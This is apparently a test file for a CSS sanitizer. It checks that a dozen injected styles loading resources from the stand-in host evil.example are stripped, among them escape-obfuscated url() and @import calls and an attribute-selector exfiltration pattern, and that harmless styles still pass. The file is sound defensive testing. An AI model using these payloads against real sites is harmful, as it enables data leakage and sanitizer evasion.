import { test } from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeCss } from '../src/lib/customCss.ts';

const leaks = (css: string) => /https?:|\/\/evil/i.test(sanitizeCss(css).replace(/\/\*.*?\*\//g, ''));

test('outside links are removed, however they are written', () => {
  for (const css of [
    'body{background:url(https://evil.example/a.png)}',
    'body{background:url("https://evil.example/a.png")}',
    'body{background:\\75 rl(https://evil.example/a)}',
    'body{background:\\75\\72\\6c(https://evil.example/a)}',
    'body{background:u\\rl(https://evil.example/a)}',
    'body{background:url(https://evil.example/a',
    'body{background:src("https://evil.example/a")}',
    'body{background:image-set("https://evil.example/a" 1x)}',
    'body{background:-webkit-image-set("https://evil.example/a" 1x)}',
    '@import "https://evil.example/x.css";',
    '@\\69mport "https://evil.example/x.css";',
    'input[value^="a"]{background:URL(//evil.example/a)}',
  ]) {
    assert.ok(!leaks(css), `leaked: ${css} -> ${sanitizeCss(css)}`);
  }
});

test('normal styles and embedded pictures keep working', () => {
  const ok = '.chat{color:#fff;background:url(data:image/png;base64,AAAA)}\n.a::before{content:"→"}';
  assert.equal(sanitizeCss(ok), ok);
  assert.match(sanitizeCss('.x{border-radius:8px}'), /border-radius:8px/);
});
